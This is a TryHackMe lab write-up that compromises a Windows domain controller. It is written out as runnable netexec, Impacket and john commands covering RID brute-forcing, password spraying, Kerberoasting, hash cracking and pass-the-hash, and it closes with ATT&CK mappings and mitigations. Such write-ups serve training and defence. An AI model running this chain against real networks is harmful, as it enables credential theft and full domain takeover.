# TryHackMe: Soupedecode 01 - Write-Up

## Room Information

- **Room Name:** soupedecode01
- **Difficulty:** Medium
- **Target IP:** 10.64.132.85
- **Domain:** SOUPEDECODE.LOCAL
- **OS:** Windows Server 2022 Build 20348

---

## Phase 1: Initial Enumeration

### Port Scan

```
nmap -T4 -n -sC -sV -Pn -p- 10.64.132.85
```

**Open Ports:**
- 53 (DNS)
- 88 (Kerberos)
- 135 (MSRPC)
- 139 (NetBIOS)
- 389 (LDAP)
- 445 (SMB)
- 464 (Kpasswd5)
- 593 (RPC over HTTP)
- 636 (LDAPS)
- 3268/3269 (Global Catalog)
- 3389 (RDP)

**Key Information:**
- Hostname: DC01
- Domain: SOUPEDECODE.LOCAL
- It's a Domain Controller

### SMB Share Enumeration

```
netexec smb 10.64.132.85 -u 'guest' -p '' --shares
```

**Result:** Guest user has READ access to IPC$ share

---

## Phase 2: User Discovery

### RID Brute Force

Using the guest account, enumerate domain users:

```
netexec smb 10.64.132.85 -u 'guest' -p '' --rid-brute 3000
```

**Output:** Extracted valid usernames including `ybob317`

---

## Phase 3: User Flag

### Password Spraying

Attempt to authenticate each user with their own username as password:

```
netexec smb 10.64.132.85 -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
```

**Found:** `ybob317:ybob317`

### Access User Share

```
smbclient.py 'SOUPEDECODE.LOCAL/ybob317:ybob317@10.64.132.85'
# use Users
# cd ybob317/Desktop
# get user.txt
```

**User Flag:** `28189316c25dd3c0ad56d44d000d62a8`

---

## Phase 4: Kerberoasting

### Extract TGS Hashes

With valid credentials, perform Kerberoasting:

```
GetUserSPNs.py -request -outputfile kerberoastables.txt 'SOUPEDECODE.LOCAL/ybob317:ybob317'
```

**Kerberoastable Accounts:**
- FTP/FileServer: file_svc
- FW/ProxyServer: firewall_svc
- HTTP/BackupServer: backup_svc
- HTTP/WebServer: web_svc
- HTTPS/MonitoringServer: monitoring_svc

### Crack TGS Hashes

Use john with rockyou.txt wordlist:

```
john --format=krb5tgs kerberoastables.txt --wordlist=/usr/share/seclists/Passwords/wordlist/rockyou.txt
```

**Cracked:** `file_svc:Password123!!`

---

## Phase 5: Access Backup Share

### Enumerate Shares with file_svc

```
netexec smb 10.64.132.85 -u 'file_svc' -p 'Password123!!' --shares
```

**New Access:** `backup` share (READ)

### Download Backup File

```
smbclient.py 'SOUPEDECODE.LOCAL/file_svc:Password123!!@10.64.132.85'
# use backup
# get backup_extract.txt
```

**File Contents:** backup_extract.txt contains NTLM hashes for service accounts

---

## Phase 6: Hash Spraying

### Extract Hashes and Users

```bash
cat backup_extract.txt | cut -d ':' -f 1 > users.txt
cat backup_extract.txt | cut -d ':' -f 4 > hashes.txt
```

### Spray NTLM Hashes

```
netexec smb 10.64.132.85 -u users.txt -H hashes.txt --no-bruteforce --continue-on-success
```

**Found:** `FileServer$:e41da7e79a4c76dbd9cf79d1cb325559` - **(Pwn3d!)**

The (Pwn3d!) tag indicates administrative privileges!

---

## Phase 7: Root Flag

### Access as FileServer$

```
smbclient.py -hashes :e41da7e79a4c76dbd9cf79d1cb325559 'SOUPEDECODE.LOCAL/FileServer$@10.64.132.85'
# use C$
# cd Users/Administrator/Desktop
# get root.txt
```

**Root Flag:** `27cb2be302c388d63d27c86bfdd5f56a`

### Why FileServer$ has Admin Access

The FileServer$ account is a member of the Enterprise Admins group, granting domain-wide administrative privileges.

---

## Attack Chain Summary

```
guest (RID brute) → ybob317:ybob317 → Kerberoasting → 
file_svc:Password123!! → backup share → backup_extract.txt → 
NTLM hashes → FileServer$ (admin) → ROOT FLAG
```

## MITRE ATT&CK Techniques

- T1087.001 - Account Discovery: Domain Account (RID Bruteforce)
- T1110 - Brute Force (Password Spraying)
- T1552.001 - Credentials in Files (SMB Shares)
- T1003 - OS Credential Dumping (Kerberoasting)
- T1550.002 - Use Alternative Authentication Material (Pass-the-Hash)
- T1021.002 - SMB/Windows Admin Shares

## Mitigation Recommendations

1. **Disable RID Brute Force:** Restrict anonymous enumeration
2. **Strong Password Policy:** Enforce complex passwords, especially for service accounts
3. **Kerberoasting Mitigation:** Use Managed Service Accounts (MSAs) or disable RC4 encryption
4. **Least Privilege:** Avoid giving service accounts Enterprise Admin privileges
5. **Monitor:** Enable logging for Kerberos and SMB activities